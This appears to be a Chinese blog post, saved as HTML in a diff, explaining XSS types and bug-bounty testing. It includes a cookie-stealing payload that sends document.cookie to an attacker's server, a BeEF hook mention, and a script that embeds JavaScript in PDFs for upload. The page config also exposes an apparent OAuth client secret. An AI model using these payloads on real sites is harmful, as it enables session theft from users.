@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>web漏洞挖掘指南 -XSS跨站脚本攻击 - Mr·Yang</title><meta name="Description" content="Mr·Yang"><meta property="og:title" content="web漏洞挖掘指南 -XSS跨站脚本攻击" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ybrc.github.io/zh-cn/14-3/" /><meta property="og:image" content="https://ybrc.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-14T14:27:22+08:00" />
+<meta property="article:modified_time" content="2022-01-02T18:17:06+08:00" /><meta property="og:site_name" content="Mr·Yang" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ybrc.github.io/logo.png"/>
+
+<meta name="twitter:title" content="web漏洞挖掘指南 -XSS跨站脚本攻击"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Mr·Yang">
+<meta name="apple-mobile-web-app-title" content="Mr·Yang"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://ybrc.github.io/zh-cn/14-3/" /><link rel="prev" href="https://ybrc.github.io/zh-cn/14-2/" /><link rel="next" href="https://ybrc.github.io/zh-cn/15/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "web漏洞挖掘指南 -XSS跨站脚本攻击",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/ybrc.github.io\/zh-cn\/14-3\/"
+        },"genre": "posts","keywords": "WEB, 漏洞, 攻击, XSS, 挖掘","wordcount":  1779 ,
+        "url": "https:\/\/ybrc.github.io\/zh-cn\/14-3\/","datePublished": "2021-11-14T14:27:22+08:00","dateModified": "2022-01-02T18:17:06+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Mr·Yang"},"author": {
+                "@type": "Person",
+                "name": "Mr·Yang"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/zh-cn/" title="Mr·Yang"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/zh-cn/posts/"><i class='fas fa-archive fa-fw'></i> 所有文章 
+                        </a><a class="menu-item" href="/zh-cn/tags/"><i class='fas fa-tags fa-fw'></i> 标签 
+                        </a><a class="menu-item" href="/zh-cn/categories/"><i class='fas fa-th-list fa-fw'></i> 分类 
+                        </a><a class="menu-item" href="/zh-cn/timeline/"><i class='fas fa-user-astronaut fa-fw'></i> 时间线 
+                        </a><a class="menu-item" href="/zh-cn/sources/"><i class='fas fa-door-closed fa-fw'></i> 资源 
+                        </a><a class="menu-item" href="/zh-cn/loveu/" title="表白"><i class='fas fa-heart fa-fw'></i> 表白 
+                        </a><a class="menu-item" href="https://ybrc.github.io" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  
+                        </a>   
+                        <div class="dropdown">
+                            <a href="/zh-cn/about/" class="menu-item menu-more dropbtn" title="关于" ><i class='fas fa-user-secret fa-fw'></i> 关于 
+                            </a>
+                            <div class="menu-more-content dropdown-content"><a href="/zh-cn/books/" title="书籍文献" ><i class='fas fa-charging-station fa-fw'></i> 书籍文献 </a><a href="/zh-cn/talk/" title="在线聊天" ><i class='fas fa-user-secret fa-fw'></i> 在线聊天 </a><a href="/zh-cn/exppoc/" title="渗透测试" ><i class='fas fa-tag fa-fw'></i> ExpPOC </a><a href="/zh-cn/mryang/" title="前方高能♂ 小心外放！" ><i class='fas fa-dizzy fa-fw'></i> 燥起来！  </a></div>
+                        </div>
+                    <span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/zh-cn/14-3/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/zh-cn/" title="Mr·Yang"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/zh-cn/posts/"><i class='fas fa-archive fa-fw'></i> 所有文章 
+                    </a><a class="menu-item" href="/zh-cn/tags/"><i class='fas fa-tags fa-fw'></i> 标签 
+                    </a><a class="menu-item" href="/zh-cn/categories/"><i class='fas fa-th-list fa-fw'></i> 分类 
+                    </a><a class="menu-item" href="/zh-cn/timeline/"><i class='fas fa-user-astronaut fa-fw'></i> 时间线 
+                    </a><a class="menu-item" href="/zh-cn/sources/"><i class='fas fa-door-closed fa-fw'></i> 资源 
+                    </a><a class="menu-item" href="/zh-cn/loveu/" title="表白"><i class='fas fa-heart fa-fw'></i> 表白 
+                    </a><a class="menu-item" href="https://ybrc.github.io" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  
+                    </a>   
+                    <div class="dropdown">
+                        <a href="/zh-cn/about/" class="menu-item menu-more dropbtn" title="关于" ><i class='fas fa-user-secret fa-fw'></i> 关于 
+                        </a>
+                        <div class="menu-more-content dropdown-content"><a href="/zh-cn/books/" title="书籍文献" ><i class='fas fa-charging-station fa-fw'></i> 书籍文献 </a><a href="/zh-cn/talk/" title="在线聊天" ><i class='fas fa-user-secret fa-fw'></i> 在线聊天 </a><a href="/zh-cn/exppoc/" title="渗透测试" ><i class='fas fa-tag fa-fw'></i> ExpPOC </a><a href="/zh-cn/mryang/" title="前方高能♂ 小心外放！" ><i class='fas fa-dizzy fa-fw'></i> 燥起来！  </a></div>
+                    </div>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/zh-cn/14-3/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">web漏洞挖掘指南 -XSS跨站脚本攻击</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/zh-cn/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Mr·Yang</a></span>&nbsp;<span class="post-category">收录于 <a href="/zh-cn/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/zh-cn/categories/%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw"></i>漏洞</a>&nbsp;<a href="/zh-cn/categories/%E6%94%BB%E5%87%BB/"><i class="far fa-folder fa-fw"></i>攻击</a>&nbsp;<a href="/zh-cn/categories/xss/"><i class="far fa-folder fa-fw"></i>XSS</a>&nbsp;<a href="/zh-cn/categories/%E6%8C%96%E6%8E%98/"><i class="far fa-folder fa-fw"></i>挖掘</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-14">2021-11-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1779 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#xss跨站脚本攻击">XSS跨站脚本攻击</a>
+      <ul>
+        <li><a href="#一漏洞原理">一、漏洞原理</a></li>
+        <li><a href="#二xss漏洞检测">二、XSS漏洞检测</a></li>
+        <li><a href="#三xss漏洞利用">三、XSS漏洞利用</a></li>
+        <li><a href="#四markdown-xss">四、Markdown XSS</a></li>
+        <li><a href="#五上传pdf导致的xss">五、上传PDF导致的XSS</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        data-src="https://tool.lu/netcard/"
+        data-srcset="https://tool.lu/netcard/, https://tool.lu/netcard/ 1.5x, https://tool.lu/netcard/ 2x"
+        data-sizes="auto"
+        alt="https://tool.lu/netcard/"
+        title="IP定位"
+    /></p>
+<h1 id="heading"></h1>
+<h1 id="web漏洞挖掘指南">web漏洞挖掘指南</h1>
+<h2 id="xss跨站脚本攻击">XSS跨站脚本攻击</h2>
+<h3 id="一漏洞原理">一、漏洞原理</h3>
+<p>\1. 跨站脚本英文全称（Cross Site Scripting跨站脚本），为了不和css层叠样式表(英文全称：Cascading Style Sheets)混淆，因此将跨站脚本缩写为XSS。产生XSS漏洞根本原因其实是web应用未对用户的输入进行严格的过滤和转义，导致攻击者可从正常的输入功能注入脚本代码，我常将xss攻击理解为一种javascript注入，当带有xss恶意代码的页面被其他用户访问到时，js便会被执行，js脚本可以执行很多操作，比如：窃取用户cookie，读取用户键盘记录，截屏，恶意跳转等，甚至可以结合BEEF的hook.js钩子劫持用户浏览器。</p>
+<h3 id="二xss漏洞检测">二、XSS漏洞检测</h3>
+<p>\1. 公认XSS有三种类型：反射型、存储型、dom型。根据字面意思很好区分三者，反射型即服务器根据用户当前输入做出的响应，只能触发一次，这个过程就像一次反射。因此市面上大多self-xss都来自反射型xss，攻击者输入xss脚本，输出仅自己看到，仅xss到自己，常在查询、搜索等功能出现。
+\2. 存储型xss即页面保存了攻击者输入的恶意代码，除非对应记录被删除，否则可以一直触发xss，常在留言、个人信息登记等功能出现。
+\3. dom型xss比较独特，它涉及的两个层次不是服务器端和浏览器端，而是浏览器端的JavaScript层和HTML层。换种更好理解的说法也就是：从服务器脚本变成了客户端脚本，dom xss的payload不需要服务端解析响应，而是靠浏览器的dom解析，因此dom-xss的触发是抓不到请求包的。漏洞示例xss.html：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">    <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tr1&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+                    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;tr1&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">);</span>
+            <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741759-722253-untitled-10.png"
+        data-srcset="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741759-722253-untitled-10.png, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741759-722253-untitled-10.png 1.5x, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741759-722253-untitled-10.png 2x"
+        data-sizes="auto"
+        alt="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741759-722253-untitled-10.png"
+        title="Untitled"
+    />
+\4. xss漏洞检测用弹窗进行测试即可，常见的几种弹窗方法：alert()、confirm()、prompt()、console.log()。测试时，尽量结合各种xss类型的特征对功能点进行验证，除了大家常说的“有框即插(看见输入框就盲插xss payload)”，还需注意请求中的各种参数，是否可以原样输出或者以html代码的形式保存到了另一个页面。</p>
+<h3 id="三xss漏洞利用">三、XSS漏洞利用</h3>
+<p>\1. 上文提到过，xss的本质其实是js代码的注入，所以XSS漏洞的危害来源于js代码执行，最常见的就是盗取用户cookie，但是在实际场景中我们经常会遇到cookie设置httponly属性导致无法通过js脚本读取的情况，这时还可以读取用户键盘记录，截屏，恶意跳转等，甚至可以结合BEEF的hook.js钩子劫持用户浏览器。
+\2. 以最简单的盗取cookie的payload为例，先用python搭建web服务充当xss平台：
+<img
+        class="lazyload"
+        data-src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741786-502257-untitled-11.png"
+        data-srcset="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741786-502257-untitled-11.png, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741786-502257-untitled-11.png 1.5x, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741786-502257-untitled-11.png 2x"
+        data-sizes="auto"
+        alt="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741786-502257-untitled-11.png"
+        title="Untitled"
+    />
+\3. 然后在存有xss漏洞的位置传入payload：<script>document.location=’<a href="http://ip:233/?%e2%80%99&#43;document.cookie;" target="_blank" rel="noopener noreffer">http://192.168.123.24?’+document.cookie;</a></script>
+\4. 上述payload先用<a href="http://ip:233/?%e2%80%99&#43;document.cookie;" target="_blank" rel="noopener noreffer">document.cookie</a>获取了用户cookie，然后利用document.location进行跳转，这样客户端就会携带<a href="http://ip:233/?%e2%80%99&#43;document.cookie;" target="_blank" rel="noopener noreffer">document.cookie</a>的值访问xss平台，通过xss平台的web日志即可查看对应记录：
+<img
+        class="lazyload"
+        data-src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741841-53099-untitled.jpg"
+        data-srcset="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741841-53099-untitled.jpg, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741841-53099-untitled.jpg 1.5x, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741841-53099-untitled.jpg 2x"
+        data-sizes="auto"
+        alt="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741841-53099-untitled.jpg"
+        title="Untitled"
+    />
+\5. 市面上的xss平台其实已经编写出很多成熟的xss利用模板了，js代码操作不熟练的师傅可以直接套用xss平台的模板：
+<img
+        class="lazyload"
+        data-src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741857-24672-untitled-12.png"
+        data-srcset="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741857-24672-untitled-12.png, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741857-24672-untitled-12.png 1.5x, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741857-24672-untitled-12.png 2x"
+        data-sizes="auto"
+        alt="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741857-24672-untitled-12.png"
+        title="Untitled"
+    /></p>
+<h3 id="四markdown-xss">四、Markdown XSS</h3>
+<p>\1. Markdown 是一种轻量级标记语言，它允许人们使用纯文本格式编写文档。通过简单的文本方式标记就能指定格式，轻轻松松完成文档的编辑。markdown语言从文本-指定格式的转换过程可以看作一系列的html转换，最终以html标签的形式存储在页面上，因此markdown编辑器也可能出现XSS漏洞。
+\2. 插入超链接：
+<img
+        class="lazyload"
+        data-src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741901-716534-untitled-13.png"
+        data-srcset="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741901-716534-untitled-13.png, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741901-716534-untitled-13.png 1.5x, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741901-716534-untitled-13.png 2x"
+        data-sizes="auto"
+        alt="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741901-716534-untitled-13.png"
+        title="Untitled"
+    />
+<img
+        class="lazyload"
+        data-src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741646-907279-image.png"
+        data-srcset="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741646-907279-image.png, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741646-907279-image.png 1.5x, https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741646-907279-image.png 2x"
+        data-sizes="auto"
+        alt="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741646-907279-image.png"
+        title="Untitled"
+    />
+\4. 除了插入超链接，我们还可以参照常规的XSS payload进行尝试，比如<img>、<svg>等标签。参考案例：
+<a href="http://www.52bug.cn/hkjs/3292.html" target="_blank" rel="noopener noreffer">http://www.52bug.cn/hkjs/3292.html</a>
+<a href="https://mp.weixin.qq.com/s/7Qa4o0sYfJei07K3mjL-GA" target="_blank" rel="noopener noreffer">https://mp.weixin.qq.com/s/7Qa4o0sYfJei07K3mjL-GA</a></p>
+<h3 id="五上传pdf导致的xss">五、上传PDF导致的XSS</h3>
+<p>\1. 之前在论坛上看到过有师傅通过把xss代码加到pdf文件，然后通过正常的文件上传功能传至目标服务器中，利用浏览器自带的pdf阅读功能触发xss，这类漏洞还是会有部分厂商会确认的，参考文章：</p>
+<p><a href="https://www.t00ls.cc/thread-48480-1-1.html" target="_blank" rel="noopener noreffer">https://www.t00ls.cc/thread-48480-1-1.html</a>
+<a href="https://www.t00ls.cc/articles-62790.html" target="_blank" rel="noopener noreffer">https://www.t00ls.cc/articles-62790.html</a>
+pdf文件还是很少被禁止上传的，众测项目中可以尝试此类测试。
+\2. 利用条件：1.有pdf文件上传点 2.保存好的pdf文件可以直接浏览器查看，而不是只能下载至本地。
+\3. python脚本一键生成带有xss代码的pdf文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">    <span class="kn">from</span> <span class="nn">PyPDF2</span> <span class="kn">import</span> <span class="n">PdfFileWriter</span>
+    <span class="n">file</span> <span class="o">=</span> <span class="n">PdfFileWriter</span><span class="p">()</span>
+    <span class="n">file</span><span class="o">.</span><span class="n">addJS</span><span class="p">(</span><span class="s1">&#39;app.alert(&#34;XSS&#34;);&#39;</span><span class="p">)</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;xss.pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
+    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><meting-js url="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Music/16.mp3" name="" artist="Mr·Yang" cover="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@img/avatar.png" theme="#448aff" fixed="true" autoplay="true" volume="100"></meting-js>
+<img src="https://tool.lu/netcard/"><div class="post-reward">
+  <input type="checkbox" name="reward" id="reward" hidden />
+  <label class="reward-button" for="reward">赞赏支持</label>
+  <div class="qr-code">
+    
+    
+	
+    <label class="qr-code-image" for="reward">
+        
+        <img class="image" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/img/weplay.jpg">
+        
+        <span>微信打赏</span>
+      </label>
+    <label class="qr-code-image" for="reward">
+        
+        <img class="image" src="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/img/AliPlay.png">
+        
+        <span>支付宝打赏</span>
+      </label>
+  </div>
+</div>
+
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-01-02&nbsp;<a class="git-hash" href="https://github.com/ybrc/ybrc.github.io/commit/7ebe9aaea52d6821a3aebcf43486a90329d9222c" target="_blank" title="commit by CreatorYBCBrainOut013694(CreatorYBCBrainOut013694@outlook.com) 7ebe9aaea52d6821a3aebcf43486a90329d9222c: 2022/01/02">
+                                    <i class="fas fa-hashtag fa-fw"></i>7ebe9aa</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/zh-cn/14-3/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/zh-cn/tags/web/">Web</a>,&nbsp;<a href="/zh-cn/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>,&nbsp;<a href="/zh-cn/tags/%E6%94%BB%E5%87%BB/">攻击</a>,&nbsp;<a href="/zh-cn/tags/xss/">XSS</a>,&nbsp;<a href="/zh-cn/tags/%E6%8C%96%E6%8E%98/">挖掘</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/zh-cn/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/zh-cn/14-2/" class="prev" rel="prev" title="常用IDA脚本开发API"><i class="fas fa-angle-left fa-fw"></i>常用IDA脚本开发API</a>
+            <a href="/zh-cn/15/" class="next" rel="next" title="iPhone逆向环境搭建">iPhone逆向环境搭建<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">欢迎👏来到Mr·Yang的博客</div><div class="footer-line">
+                    <div class="footer-line">
+                        <span id="run-time"></span>
+                    </div>由 <a href="https://ybrc.github.io/" target="_blank" rel="noopener noreffer" title="Mr·Yang 0.91.2">Mr·Yang</a> 强力驱动 | 主题 - <a href="https://ybrc.github.io" target="_blank" rel="noopener noreffer" title="Mr·Yang 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> KissU</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2022</span><span id="busuanzi_container_site_pv">
+                本站访问量：<font color="red"><span id="busuanzi_value_site_pv"></span></font>次
+</span>
+            &nbsp;
+            <span id="busuanzi_container_site_uv">
+                您是本站第：<font color="red"><span id="busuanzi_value_site_uv"></span></font>位访问者
+</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/zh-cn/" target="_blank">Mr·Yang</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/aplayer/APlayer.min.css"><link rel="stylesheet" href="/lib/aplayer/dark.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/aplayer/APlayer.min.js"></script><script type="text/javascript" src="/lib/meting/Meting.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":9},"comment":{"gitalk":{"admin":["ybrc"],"clientID":"f63ed115f939ee05777b","clientSecret":"8932e1a5ea8769617e1767f45deb9cdc256d1beb","id":"2021-11-14T14:27:22+08:00","owner":"ybrc","repo":"ybrc.github.io","title":"web漏洞挖掘指南 -XSS跨站脚本攻击"}},"data":{"id-1":"[Root@Mr·Yang]#\u003e_","id-2":"[Root@Mr·Yang]#\u003e_"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/zh-cn/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js"></script><div class="pjax-assets"><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/gitalk/gitalk.min.css">
+    <noscript><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"></noscript></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
